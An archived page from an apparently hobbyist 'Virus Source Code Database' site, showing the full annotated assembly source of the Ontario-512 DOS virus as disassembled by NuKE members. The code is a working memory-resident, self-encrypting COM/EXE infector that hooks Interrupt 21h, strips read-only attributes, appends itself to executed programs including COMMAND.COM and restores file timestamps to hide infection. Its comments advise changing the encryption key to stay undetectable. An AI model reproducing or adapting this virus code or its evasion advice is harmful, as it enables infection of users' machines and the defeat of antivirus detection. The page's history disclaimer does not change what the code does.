<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: nont-512_asm</title>
<meta name="KEYWORDS" content="nont-512.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for nont-512.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="naktruth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naktruth_asm.php">naktruth_asm</a><br>
<a href="narcosis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/narcosis_asm.php">narcosis_asm</a><br>
<a href="natas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/natas_asm.php">natas_asm</a><br>
<a href="nav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nav_asm.php">nav_asm</a><br>
<a href="navigatr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigatr_asm.php">navigatr_asm</a><br>
<a href="navigtor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigtor_asm.php">navigtor_asm</a><br>
<a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/naziph2b_pas.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/naziph2b_pas.php'" tppabs="http://www.totallygeek.com/vscdb/n/naziph2b_pas.php">naziph2b_pas</a><br>
<a href="naziph2_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziph2_pas.php">naziph2_pas</a><br>
<a href="naziphob_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziphob_pas.php">naziphob_pas</a><br>
<a href="nd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nd_asm.php">nd_asm</a><br>
<a href="necro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/necro_asm.php">necro_asm</a><br>
<a href="ned09__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09__asm.php">ned09__asm</a><br>
<a href="ned09_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09_asm.php">ned09_asm</a><br>
<a href="ned_demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned_demo_asm.php">ned_demo_asm</a><br>
<a href="neuro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuro_asm.php">neuro_asm</a><br>
<a href="neuroeng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuroeng_asm.php">neuroeng_asm</a><br>
<a href="neverend_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverend_asm.php">neverend_asm</a><br>
<a href="neverone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverone_asm.php">neverone_asm</a><br>
<a href="newc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newc_asm.php">newc_asm</a><br>
<a href="newtroi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newtroi_asm.php">newtroi_asm</a><br>
<a href="newvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newvir_asm.php">newvir_asm</a><br>
<a href="newzland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzland_asm.php">newzland_asm</a><br>
<a href="newzlnd2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlnd2_asm.php">newzlnd2_asm</a><br>
<a href="newzlndb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlndb_asm.php">newzlndb_asm</a><br>
<a href="nhackerf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nhackerf_asm.php">nhackerf_asm</a><br>
<a href="nibbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nibbles_asm.php">nibbles_asm</a><br>
<a href="nina___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina___asm.php">nina___asm</a><br>
<a href="nina__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina__asm.php">nina__asm</a><br>
<a href="nina_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina_asm.php">nina_asm</a><br>
<a href="nina-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina-d_asm.php">nina-d_asm</a><br>
<a href="ninja_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja_1_asm.php">ninja_1_asm</a><br>
<a href="ninja-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja-1_asm.php">ninja-1_asm</a><br>
<a href="ninja1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja1_asm.php">ninja1_asm</a><br>
<a href="nkpox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nkpox11_asm.php">nkpox11_asm</a><br>
<a href="no_1_a_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_a_pas.php">no_1_a_pas</a><br>
<a href="no_1_b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_b_pas.php">no_1_b_pas</a><br>
<a href="nobeaste_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeaste_asm.php">nobeaste_asm</a><br>
<a href="nobeastf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeastf_asm.php">nobeastf_asm</a><br>
<a href="noint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/noint_asm.php">noint_asm</a><br>
<a href="nomem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomem_asm.php">nomem_asm</a><br>
<a href="nomncltr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomncltr_asm.php">nomncltr_asm</a><br>
<a href="nont-512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nont-512_asm.php">nont-512_asm</a><br>
<a href="not_casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/not_casc_asm.php">not_casc_asm</a><br>
<a href="notimp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/notimp_asm.php">notimp_asm</a><br>
<a href="npox10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox10_asm.php">npox10_asm</a><br>
<a href="npox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox11_asm.php">npox11_asm</a><br>
<a href="npox_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_1_asm.php">npox_1_asm</a><br>
<a href="npox-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-1_asm.php">npox-1_asm</a><br>
<a href="npox21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox21_asm.php">npox21_asm</a><br>
<a href="npox_v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v10_asm.php">npox_v10_asm</a><br>
<a href="npox-v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v10_asm.php">npox-v10_asm</a><br>
<a href="npox_v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v11_asm.php">npox_v11_asm</a><br>
<a href="npox-v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v11_asm.php">npox-v11_asm</a><br>
<a href="npox-v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v20_asm.php">npox-v20_asm</a><br>
<a href="npox-v21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v21_asm.php">npox-v21_asm</a><br>
<a href="nrlg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlg_asm.php">nrlg_asm</a><br>
<a href="nrlgsant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlgsant_asm.php">nrlgsant_asm</a><br>
<a href="nukex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nukex_asm.php">nukex_asm</a><br>
<a href="number1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_asm.php">number1_asm</a><br>
<a href="number1b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1b_pas.php">number1b_pas</a><br>
<a href="number_1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_1_pas.php">number_1_pas</a><br>
<a href="number1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_pas.php">number1_pas</a><br>
<a href="number_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_6_asm.php">number_6_asm</a><br>
<a href="number-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number-6_asm.php">number-6_asm</a><br>
<a href="number6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number6_asm.php">number6_asm</a><br>
<a href="nymphmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nymphmit_asm.php">nymphmit_asm</a><br>
<a href="nzeland2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland2_asm.php">nzeland2_asm</a><br>
<a href="nzeland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland_asm.php">nzeland_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;-*                        Ontario-512 Virus                          *-
;*-                       ~~~~~~~~~~~~~~~~~~~                         -*
;-*  Disassmembly by: Rock Steady/NuKE                                *-
;*-  ~~~~~~~~~~~~~~~~ Pure Energy/NuKE                                -*
;-*  Notes: Resident EXE and COM infector, will infect COMMAND.COM    *-
;*-  ~~~~~~ on execution. 512 bytes file increase, memory decrease    -*
;-*         of about 2,048 bytes. Anti-debugging, encrypted virus.    *-
;*-                                                                   -*
;-* (c) Copy-Ya-Rite [NuKE] Viral Development Labs '92                *-
;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
virus       segment byte public
            assume  cs:virus, ds:virus

            org     100h                    ;Guess its a COM File huh?
ont         proc    far

start:
            jmp     go4it                   ;Jump to beginning of the
            db      1Dh                     ;Virus And start!
            db      'fected [NuKE]''92', 0Dh, 0Ah, '$'
            mov     dx,0102h        ;This is the small File the Virus
            mov     ah,09h          ;is infected to! As you see it only
            int     21h             ;displays that messages and exits
            int     20h             ;Exit Command for COMs
go4it:
            nop
            call    decrypt         ;Get Decryption value & Decrypt viri
            call    virus_start     ;Start the Virus!
ont         endp

;---------------------------------------------------------------------;
;                   The Start of the Virus Code                       ;
;---------------------------------------------------------------------;

virus_start           proc    near
            pop     bp
            sub     bp,7
            mov     ax,0FFFFh             ;Is Virus in Memory hooked on?
            int     21h                     ;the Int 21h?
            or      ah,ah                   ;
            jz      bye_bye                 ;Yes it is... Quit then...
            push    ds
            xor     ax,ax
            mov     ds,ax
            sub     word ptr ds:413h,2
            lds     bx,dword ptr ds:84h
            mov     word ptr cs:[200h][bp],bx
            mov     word ptr cs:[202h][bp],ds
            mov     bx,es
            dec     bx
            mov     ds,bx
            sub     word ptr ds:3,80h
            mov     ax,ds:12h
            sub     ax,80h
            mov     ds:12h,ax
            mov     es,ax
            push    cs
            pop     ds
            mov     si,bp
            xor     di,di
            mov     cx,204h
            cld
            rep     movsb
            mov     ds,cx
            cli                             ;This is where we hook the
            mov     word ptr ds:84h,7Fh     ;virus to the Int21h
            mov     word ptr ds:84h+2,ax
            sti
            mov     ax,4BFFh
            int     21h
            pop     ds
            push    ds
            pop     es
bye_bye:
            or      bp,bp
            jz      what
            lea     si,[bp+7Bh]
            nop
            mov     di,offset ds:[100h]
            push    di
            cld
            movsw
            movsw
            retn
what:
            mov     ax,es
            add     cs:7dh,ax
;*          jmp     far ptr go4it7
virus_start           endp
            db      0EAh,0EBh, 15h, 49h, 6Eh
            cmp     ax,0FFFFh
            jne     new_21h
            inc     ax
            iret
;---------------------------------------------------------------------;
;                     Interrupt 21h handler                           ;
;---------------------------------------------------------------------;
new_21h:
           cmp     ah,4Bh        ;Test, is File beginning Executed!
           jne     leave_ok      ;Nope! Call Int21!
           cmp     al,3          ;Overlay, beginning execute?
           je      leave_ok      ;Yes! Leave it alone
           cmp     al,0FFh       ;Virus testing to see if its alive?
           jne     do_it_man     ;in memory?
           push    cs
           pop     ds
           mov     dx,1DDh
           call    infect
           iret
do_it_man:
           call    infect       ;Infect file dude...
leave_ok:
           jmp     dword ptr cs:[200h]  ;Int21 handler..

;---------------------------------------------------------------------;
;              Infection Routine for the Ontario Virus                ;
;---------------------------------------------------------------------;

infect     proc    near
           push    es
           push    ds              ;Save them not to fuck things up..
           push    dx
           push    cx
           push    bx
           push    ax
           mov     ax,4300h        ;Here we get the file attribute
           call    int21           ;for file to be infected.
           jc      outta           ;Bitch Error encountered. Quit!
           test    cl,1            ;Test if its Read-Only!
           jz      attrib_ok       ;Ok, it ain't Read-Only Continue!
           and     cl,0FEh         ;Set Read-Only to normal Attribs
           mov     ax,4301h        ;Call Ints to do it...
           call    int21           ;Bingo! Done!
           jc      outta           ;Error encountered? Split if yes!
attrib_ok:
           mov     ax,3D02h        ;Open file for Read/Write
           call    int21           ;Call Interrupt to do it!
           jnc     open_ok         ;no errors? Continue!
outta:
           jmp     go4it5          ;Hey, Split Man... Errors happened!
open_ok:
           mov     bx,ax           ;BX=File Handle
           push    cs
           pop     ds
           mov     ax,5700h        ;Get File's Date & Time
           call    int21           ;Do it!
           mov     word ptr ds:[204h],cx  ;Save Time
           mov     word ptr ds:[206h],dx  ;Save Date
           mov     dx,208h         ;DX=Pointer
           mov     cx,1Bh          ;CX=Number of Btyes
           mov     ah,3Fh          ;Read From File
           call    int21           ;Do It!
           jc      go4it1          ;Errors? Quit if yes!
           cmp     word ptr ds:[208h],5A4Dh ;Check if files already
           je      go4it0                   ;infected.
           mov     al,byte ptr ds:[209h]   ;Com , Exes...
           cmp     al,byte ptr ds:[20Bh]
           je      go4it1
           xor     dx,dx
           xor     cx,cx
           mov     ax,4202h
           call    int21           ;Move File pointer to end of
           jc      go4it1          ;file to be infected.
           cmp     ax,0E000h       ;File bigger than E000 bytes?
           ja      go4it1          ;Error...
           push    ax              ;Save File Length
           mov     ax,word ptr ds:[208h]
           mov     ds:7bh,ax
           mov     ax,word ptr ds:[20Ah]
           mov     ds:7dh,ax
           pop     ax                       ;All this is, is a complex
           sub     ax,3                     ;way to do "JMP"
           mov     byte ptr ds:[208h],0E9h  ;
           mov     word ptr ds:[209h],ax
           mov     byte ptr ds:[20Bh],al
           jmp     short go4it3             ;File READY Infect it!
           db      90h                      ;NOP me... detection string?
go4it0:
           cmp     word ptr ds:[21Ch],1
           jne     go4it2
go4it1:
           jmp     go4it4
go4it2:
           mov     ax,word ptr ds:[20Ch]
           mov     cx,200h
           mul     cx
           push    ax
           push    dx
           mov     cl,4
           ror     dx,cl
           shr     ax,cl
           add     ax,dx
           sub     ax,word ptr ds:[210h]
           push    ax
           mov     ax,word ptr ds:[21Ch]
           mov     ds:7bh,ax
           mov     ax,word ptr ds:[21Eh]
           add     ax,10h
           mov     ds:7dh,ax
           pop     ax                      ; This is continues with the
           mov     word ptr ds:[21Eh],ax   ; above to put a JMP at the
           mov     word ptr ds:[21Ch],1    ; beginning of the file!
           inc     word ptr ds:[20Ch]      ;
           pop     cx                      ;
           pop     dx                      ;
           mov     ax,4200h                ;
           call    int21
           jc      go4it4
go4it3:
           xor     byte ptr ds:[1F8h],8   ;
           xor     ax,ax                  ; Theses Lines copy the
           mov     ds,ax                  ; virus code else where
           mov     al,ds:46Ch             ; in memory to get it
           push    cs                     ; ready to infect the file
           pop     ds                     ; as we must encrypt it
           push    cs                     ; FIRST when we infect the
           pop     es                     ; file. so we'll encrypt
           mov     byte ptr ds:[1ECh],al  ; this copy we're making!
           xor     si,si                  ; and append that to the
           mov     di,offset ds:[224h]    ; end of the file
           push    di                     ;
           mov     cx,200h                ;
           cld                            ;
           rep     movsb
           mov     si,offset ds:[228h]    ;Now Encrpyt that copy of the
           call    encrypt_decrypt        ;virus we just made...
           pop     dx
           mov     cx,200h                ;Write Virus to file!
           mov     ah,40h                 ;BX=Handle, CX=Bytes
           call    int21                  ;DX=pointer to write buffer
           jc      go4it4            ;Duh? Check for errors!
           xor     cx,cx
           xor     dx,dx                  ;Now move pointer to beginning
           mov     ax,4200h               ;of file.
           call    int21
           jc      go4it4            ;Duh? Check for errors!
           mov     dx,208h                ;Write to file!
           mov     cx,1Bh                 ;CX=Bytes
           mov     ah,40h                 ;DX=pointes to buffer
           call    int21             ;Bah, HumBug
go4it4:
           mov     dx,word ptr ds:[206h]  ;Leave no tracks...
           mov     cx,word ptr ds:[204h]  ; puts back File TIME
           mov     ax,5701h               ; and DATE! on file...
           call    int21                  ;
           mov     ah,3Eh                 ;
           call    int21             ;Bah, HumBug...
go4it5:
           pop     ax                     ;Get lost...
           pop     bx
           pop     cx
           pop     dx
           pop     ds
           pop     es
           retn
infect     endp

;----------------------------------------------------------------------;
;                 The Original Interrupt 21h handler                   ;
;----------------------------------------------------------------------;

int21      proc    near
           pushf                       ;Fake an Int Call...

           call    dword ptr cs:[200h] ;Orignal Int21h Handler
           retn
int21      endp

           db      'C:\COMMAND.COM'
           db       00h, 84h

;---------------------------------------------------------------------;
;            The Simple, But VERY Effective Encryption Routine        ;
;---------------------------------------------------------------------;

decrypt    proc    near
           pop     si
           push    si
           mov     al,byte ptr cs:[1E8h][si];INCRYPTION VALUE TO CHANGE!
encrypt_decrypt:                         ;and Virus will be UNDETECTABLE
           mov     cx,1E8h            ; LENGTH OF VIRII! Change this!
loop_me:   not     al                 ; if you modief the virus!
           xor     cs:[si],al         ;
           inc     si                 ;
           loop    loop_me            ;
                                      ;
           retn
decrypt    endp


virus      ends
           end     start

;------------------------------------------------------------------------


</textarea></td></tr></table></body></html>
